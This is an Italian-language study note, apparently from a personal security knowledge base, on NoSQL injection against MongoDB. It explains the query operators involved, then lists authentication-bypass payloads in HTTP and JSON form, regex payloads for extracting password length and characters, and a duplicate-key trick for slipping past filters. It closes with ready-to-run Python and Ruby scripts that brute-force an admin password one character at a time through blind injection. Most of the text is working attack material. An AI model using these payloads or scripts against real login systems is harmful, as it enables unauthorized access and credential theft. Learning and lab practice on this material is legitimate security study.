#Exploit_noti 

- [[#Detecting Vulnerabilities]]

---
# Descrizione

Un attaccante che riesce ad interferire con le queries di un database NoSQL si dice che performa un attacco di **NoSQL Injection.** 

---
# Detecting Vulnerabilities

Quando l'attaccante invia una **singola apostrofo** (`'`) nei parametri ed il server genera un errore di sintassi, questo permette di capire che probabilmente ci troviamo di fronte ad una vulnerabilità di NoSQL Injection; similmente a come accade per [[Web Exploitations/SQL Injection]] ([writeup](https://portswigger.net/web-security/nosql-injection/lab-nosql-injection-detection)). 

Si possono anche utilizzare strumenti automatici come [[NoSQLMap]].

---
# Methods

L'iniezione **NoSQL** si verifica quando un attaccante manipola le query iniettando input dannosi in una query di una base dati **NoSQL**. A differenza dell'iniezione SQL, l'iniezione NoSQL sfrutta spesso query basate su **JSON** e operatori come `$ne`, `$gt`, `$regex` o `$where` in **MongoDB**.

---

# Injections Operator

|Operatore|Descrizione|
|---|---|
|`$ne`|diverso da|
|`$regex`|espressione regolare|
|`$gt`|maggiore di|
|`$lt`|minore di|
|`$nin`|non in|

#### **Esempio**: Una funzione di ricerca di prodotto in un'applicazione web

`db.products.find({ "price": userInput })`

Un attaccante può iniettare una query NoSQL: `{ "$gt": 0 }`.

`db.products.find({ "price": { "$gt": 0 } })`

Invece di restituire un prodotto specifico, il database restituisce tutti i prodotti con un prezzo maggiore di zero, esponendo dati.

---

# Bypass Authentication

- **Bypass dell'autenticazione di base** usando `not equal ($ne)` o `greater than ($gt)`.
#### **Dati HTTP**

- `username[$ne]=toto&password[$ne]=toto`
- `login[$regex]=a.*&pass[$ne]=lol`
- `login[$gt]=admin&login[$lt]=test&pass[$ne]=1`
- `login[$nin][]=admin&login[$nin][]=test&pass[$ne]=toto`

#### **Dati JSON**

- `{"username": {"$ne": null}, "password": {"$ne": null}}`
- `{"username": {"$ne": "foo"}, "password": {"$ne": "bar"}}`
- `{"username": {"$gt": undefined}, "password": {"$gt": undefined}}`
- `{"username": {"$gt":""}, "password": {"$gt":""}}`
-
---

# Estrazione delle Informazioni sulla Lunghezza

- Iniettare un payload usando l'operatore `$regex`. L'iniezione funziona quando la lunghezza è corretta.
#### **Dati HTTP**
- `username[$ne]=toto&password[$regex]=.{1}`
- `username[$ne]=toto&password[$regex]=.{3}`

---

# Estrazione delle Informazioni

Estrazione dei dati con l'operatore `$regex` nelle query.

#### **Dati HTTP**
- `username[$ne]=toto&password[$regex]=m.{2}`
- `username[$ne]=toto&password[$regex]=md.{1}`
- `username[$ne]=toto&password[$regex]=mdp`
- `username[$ne]=toto&password[$regex]=m.*`
- `username[$ne]=toto&password[$regex]=md.*`

#### **Dati JSON**

- `{"username": {"$eq": "admin"}, "password": {"$regex": "^m" }}`
- `{"username": {"$eq": "admin"}, "password": {"$regex": "^md" }}`
- `{"username": {"$eq": "admin"}, "password": {"$regex": "^mdp" }}`

---

# Estrazione dei Dati con l'Operatore `$in`

- `{"username":{"$in":["Admin", "4dm1n", "admin", "root", "administrator"]},"password":{"$gt":""}}`

---

# WAF e Filtri

Rimuovere la pre-condizione:
In MongoDB, se un documento contiene chiavi duplicate, solo l'ultima occorrenza della chiave avrà la precedenza.

`{"id":"10", "id":"100"}`

In questo caso, il valore finale di `"id"` sarà `100`.

---

# Blind NoSQL

#### **POST con Corpo JSON**

**Script Python**:

```
`import requests import urllib3 import string import urllib urllib3.disable_warnings()  username="admin" password="" u="http://example.org/login" headers={'content-type': 'application/json'}  while True:     for c in string.printable:         if c not in ['*','+','.','?','|']:             payload='{"username": {"$eq": "%s"}, "password": {"$regex": "^%s" }}' % (username, password + c)             r = requests.post(u, data = payload, headers = headers, verify = False, allow_redirects = False)             if 'OK' in r.text or r.status_code == 302:                 print("Found one more char : %s" % (password+c))                 password += c`

```
#### **POST con Corpo URL-encoded**

**Script Python**:

```
`import requests import urllib3 import string import urllib urllib3.disable_warnings()  username="admin" password="" u="http://example.org/login" headers={'content-type': 'application/x-www-form-urlencoded'}  while True:     for c in string.printable:         if c not in ['*','+','.','?','|','&','$']:             payload='user=%s&pass[$regex]=^%s&remember=on' % (username, password + c)             r = requests.post(u, data = payload, headers = headers, verify = False, allow_redirects = False)             if r.status_code == 302 and r.headers['Location'] == '/dashboard':                 print("Found one more char : %s" % (password+c))                 password += c`

```
#### **GET**

**Script Python**:

```
`import requests import urllib3 import string import urllib urllib3.disable_warnings()  username='admin' password='' u='http://example.org/login'  while True:   for c in string.printable:     if c not in ['*','+','.','?','|', '#', '&', '$']:       payload=f"?username={username}&password[$regex]=^{password + c}"       r = requests.get(u + payload)       if 'Yeah' in r.text:         print(f"Found one more char : {password+c}")         password += c`

```
#### **Script Ruby**:

```
`require 'httpx'  username = 'admin' password = '' url = 'http://example.org/login' CHARSET = [*'0'..'9',*'a'..'z','-'] # alphanumeric + '-' GET_EXCLUDE = ['*','+','.','?','|', '#', '&', '$'] session = HTTPX.plugin(:persistent)  while true   CHARSET.each do |c|     unless GET_EXCLUDE.include?(c)       payload = "?username=#{username}&password[$regex]=^#{password + c}"       res = session.get(url + payload)       if res.body.to_s.match?('Yeah')         puts "Found one more char : #{password + c}"         password += c       end     end   end end`
```